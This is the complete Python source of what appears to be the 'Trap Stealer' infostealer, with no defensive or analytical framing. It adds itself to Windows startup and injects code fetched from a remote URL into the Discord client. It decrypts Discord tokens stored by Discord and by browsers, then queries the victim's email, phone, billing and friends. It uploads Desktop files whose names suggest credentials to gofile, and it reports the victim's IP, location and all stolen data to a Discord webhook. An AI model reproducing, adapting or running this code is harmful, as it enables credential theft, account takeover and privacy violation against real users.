import os 
from os import getenv
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import sqlite3
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import json, socket, win32crypt, getpass


webhook = ''

file_path = os.path.realpath(__file__)
USER_NAME = getpass.getuser()

def add_to_startup(py_file_path=file_path, bat_file_path=None):
    if not bat_file_path:
        bat_file_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Write Python version to startup folder
    py_file_name = os.path.basename(py_file_path)
    py_shortcut_path = os.path.join(bat_file_path, py_file_name[:-3] + "lnk")
    python_exe_path = os.path.join(os.path.dirname(os.__file__), 'pythonw.exe')
    with open(py_shortcut_path, 'w') as shortcut_file:
        shortcut_file.write(f'[InternetShortcut]\nURL=file://{py_file_path}\nIconFile={python_exe_path}\nIconIndex=0\n')

    # Write batch file version to startup folder
    bat_file_name = os.path.basename(file_path[:-3] + ".pyw")
    bat_file_path = os.path.join(bat_file_path, bat_file_name)
    shutil.copy2(file_path, bat_file_path)

    # Replace add_to_startup() with an empty string in the copied file
    with open(bat_file_path, "r", encoding="utf-8") as f:
        contents = f.read()
    contents = contents.replace("add_to_startup()", "")
    with open(bat_file_path, "w", encoding="utf-8") as f:
        f.write(contents)

add_to_startup()

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass
requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
import requests
from Crypto.Cipher import AES

for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

# DONT TOUCH
inj_url = "https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js"



def inj_discord():
    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
    for folder_name in folder_list:
        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(folder_path):
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if file == 'index.js' and 'discord_desktop_core-' in root:
                        file_path = os.path.join(root, file)
                        inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(inj_content)

inj_discord()

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdata = loads(urlopen(Request(f"https://ipinfo.io/{ip}/json")).read().decode())
    country = ipdata["country"]
    country_code = ipdata["country"].lower()
    state = ipdata["region"]
    postal = ipdata["postal"]
    computer_name = socket.gethostname()
    private_ip = socket.gethostbyname(computer_name)
    cores = os.cpu_count()
    gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
    
    globalinfo = f":flag_{country_code}:  - `{username.upper()} | {ip} ({country})`\nMore Information 👀 : \n :flag_{country_code}: - `({state}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Core : `{cores}` \nGPU : `{gpu}` "
    return globalinfo

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://checkip.amazonaws.com")).read().decode().strip()
    except:
        pass
    return ip


ip = getip()
globalinfo = globalInfo()


# ALL PATH
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
home_dir = os.path.expanduser('~')
desktop_path = os.path.join(home_dir, 'Desktop')
downloads_path = os.path.join(home_dir, 'Downloads')

Threadlist = []
badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
from ctypes import *
from Crypto.Cipher import AES


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', c_ulong),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = create_string_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = create_string_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = create_string_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)


def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass



def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendslist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendslist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} - {friend['user']['username']}#{friend['user']['discriminator']} | ID : ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        with urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)) as response:
            billing_json = loads(response.read().decode())
    except:
        return False
    
    if not billing_json:
        return " -"

    billing = ""
    for method in billing_json:
        if not method["invalid"]:
            if method["type"] == 1:
                billing += ":credit_card:"
            elif method["type"] == 2:
                billing += ":parking: "

    return billing



def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    UserInfo = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = UserInfo["username"]
    hashtag = UserInfo["discriminator"]
    email = UserInfo["email"]
    idd = UserInfo["id"]
    pfp = UserInfo["avatar"]
    flags = UserInfo["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in UserInfo: 
        nitros = UserInfo["premium_type"]
        if nitros == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitros == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in UserInfo:
        phone = f'`{UserInfo["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


browser_path = [
    [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn"],
    [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{roaming}/Mozilla/Firefox/Profiles", "firefox.exe", "/storage/default", "/", "/networkCache", "/chrome/ididnkmllhcdpgnbehfkhbgmfigibfnh/Local Storage"],
    [f"{local}/Vivaldi/User Data", "vivaldi.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}/BraveSoftware/Brave-Browser-Beta/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}/BraveSoftware/Brave-Browser-Nightly/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}/Chromium/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],

]
discord_paths = [
    [f"{roaming}/Discord", "/Local Storage/leveldb"],
    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
    [f"{roaming}/discordptb", "/Local Storage/leveldb"]
]

def uploadToken(token, path):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, user_id, pfp, flags, nitro, phone = GetTokenInfo(token)
    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
    billing = GetBilling(token);badge = GetBadge(flags);friends = GetUHQFriends(token)
    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "username": "Trap Stealer",
        "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
        "content": "",
        "embeds": [
            {
                "title": "🍪 Trap Stealer Token",
                "description": f"`{path}` :\n",
                "color": 0xffb6c1,
                "author": {
                    "name": f"{username}#{hashtag} ({user_id})",
                    "icon_url": pfp
                },
                "footer": {
                    "text": "Trap Stealer",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                },
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "fields": [
                    {
                        "name": "✨ Token:",
                        "value": f"`{token}`"
                    },
                    {
                        "name": ":mobile_phone: Phone:",
                        "value": phone,
                        "inline": True
                    },
                    {
                        "name": ":envelope: Email:",
                        "value": f"`{email}`",
                        "inline": True
                    },
                    {
                        "name": ":beginner: Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": ":credit_card: Billing:",
                        "value": billing,
                        "inline": True
                    },
                    {
                        "name": "🔮 HQ Friends:",
                        "value": friends,
                        "inline": False
                    }
                    
                ]
            }
        ],
        "attachments": []
    }

    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)


    
def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])    
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            Tokens += tokenDecoded
                            uploadToken(tokenDecoded, path)




Tokens = ''
def get_tokens(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith((".log", ".ldb")):
            with open(os.path.join(path, file), errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                            token = re.search(regex, line)
                            if token and checkToken(token.group()):
                                if token.group() not in Tokens:
                                    Tokens += token.group()
                                    uploadToken(token.group(), path)

for paths in discord_paths: 
        a = threading.Thread(target=GetDiscord, args=[paths[0], paths[1]])
        a.start()

for paths in browser_path: 
        a = threading.Thread(target=GetDiscord, args=[paths[0], paths[2]])
        a.start()

data = {
    "username": "Trap Stealer",
    "content": "@everyone someone launched it",
    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
    "embeds": [
        {
            "title": "🍪 Trap Stealer Information",
            "description": f"{globalinfo}\n",
            "color": 0xffb6c1,
            "thumbnail": {
                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
            },
            "footer": {
                "text": "Trap Stealer | https://github.com/TheCuteOwl",
                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
            }
        }
    ]
}

headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)





keywords = ["password", "mot_de_passe", "mdp", "motdepasse", "token", "key", "secret", "secrett", "api", "account", "login", "username", "email", "phone", "credit card", "social security number", "address", "birthdate", "security question", "PIN", "passport", "driver's license", "national ID", "bank account", "routing number", "financial information", "transaction", "balance", "wire transfer", "cryptocurrency", "bitcoin", "ethereum", "wallet", "private key", "public key"]
extension = ".txt" # Extension of the files to search for


import concurrent.futures

def upload_file(file_path):
    try:
        response = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(file_path, 'rb')})
        return response.json()["data"]["downloadPage"]
    except:
        return False

file_paths = []
for file in os.listdir(desktop_path):
    if file.endswith(extension) and any(keyword in file for keyword in keywords):
        file_path = os.path.join(desktop_path, file)
        file_paths.append(file_path)

urls = []
with concurrent.futures.ThreadPoolExecutor() as executor:
    futures = []
    for file_path in file_paths:
        futures.append(executor.submit(upload_file, file_path))
    for future, file_path in zip(futures, file_paths):
        url = future.result()
        if url:
            urls.append((os.path.basename(file_path), url))
        else:
            pass


if urls:
    embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
    data = {
        "username": "Trap Stealer",
        "content": "",
        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
        "embeds": [
            {
                "title": "🍪 Trap Stealer Files",
                "description": "New files have been uploaded:",
                "color": 0xffb6c1,
                "fields": embed_fields,
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "footer": {
                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                }
            }
        ]
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

